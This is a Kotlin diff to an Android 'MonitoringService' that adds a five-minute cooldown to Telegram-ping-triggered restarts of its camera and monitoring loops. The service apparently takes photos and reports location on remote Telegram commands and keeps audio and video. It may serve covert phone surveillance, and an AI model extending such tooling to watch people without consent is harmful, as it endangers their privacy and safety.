@@ -137,6 +137,7 @@ class MonitoringService : Service() {
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val MUTATING_MAX_AGE_SEC = 300L
         private const val PING_RATE_WINDOW_MS = 30_000L
+        private const val PING_RESTART_COOLDOWN_MS = 300_000L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
         private const val MAX_VIDEO_KEPT = 3
@@ -618,6 +619,15 @@ class MonitoringService : Service() {
         override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Long>): Boolean {
             return size > 64
         }
+    }
+    private val lastPingRestartAt = java.util.concurrent.atomic.AtomicLong(0L)
+
+    private fun pingRestartDue(): Boolean {
+        return android.os.SystemClock.elapsedRealtime() - lastPingRestartAt.get() >= PING_RESTART_COOLDOWN_MS
+    }
+
+    private fun pingRestartMark() {
+        lastPingRestartAt.set(android.os.SystemClock.elapsedRealtime())
     }
 
     private suspend fun sendPairHint(senderId: String) {
@@ -1490,7 +1500,10 @@ class MonitoringService : Service() {
                 try { synchronized(pingRate) { pingRate[pingKey] = nowPing } } catch (_: Exception) { }
                 when (arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)) {
                     "camera", "photo" -> {
-                        if (senderOk && !wakeSeen) restartCameraLoop()
+                        if (senderOk && !wakeSeen && cameraJob?.isActive != true && pingRestartDue()) {
+                            restartCameraLoop()
+                            pingRestartMark()
+                        }
                         handleTelegramCommand("/photo", sentAtSec, senderOk, chatOk, wakeSeen, senderId)
                     }
                     "location", "loc", "gps" -> {
@@ -1499,8 +1512,12 @@ class MonitoringService : Service() {
                     "" -> {
                         val initialStuck = initialSyncRunning.get() && initialSyncJob?.isActive != true
                         val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && !initialStuck
-                        if (!loopsOk && senderOk && !wakeSeen) restartAllLoops()
-                        val tail = if (loopsOk || !senderOk || wakeSeen) "" else " ⏰ Loops restarted."
+                        var restarted = false
+                        if (!loopsOk && senderOk && !wakeSeen && pingRestartDue()) {
+                            restarted = restartAllLoops()
+                            if (restarted) pingRestartMark()
+                        }
+                        val tail = if (restarted) " ⏰ Loops restarted." else ""
                         if (sentAtSec > 0) {
                             val lag = System.currentTimeMillis() / 1000L - sentAtSec
                             sendToTelegram("\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s." + tail)
